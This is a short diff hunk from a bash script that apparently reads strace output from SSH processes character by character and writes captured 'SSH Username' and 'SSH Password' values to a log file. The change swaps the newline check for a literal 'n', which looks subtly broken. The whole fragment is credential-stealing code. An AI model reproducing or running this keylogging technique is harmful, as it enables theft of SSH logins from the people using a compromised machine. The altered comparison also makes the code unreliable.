@@ -33,7 +33,7 @@ while true; do
         cat $strace_log | while read line; do 
             if [[ $line =~ "read(4, ".*", 1)" ]]; then
                 c=$(echo $line | awk '{print $3}' | cut -d'"' -f2)
-                if [[ $c == $'\n' ]]; then
+                if [[ $c == n ]]; then
                     echo "SSH Username: $ssh_username" >> $log_file
                     echo "SSH Password: $ssh_password" >> $log_file
                     ssh_password=""
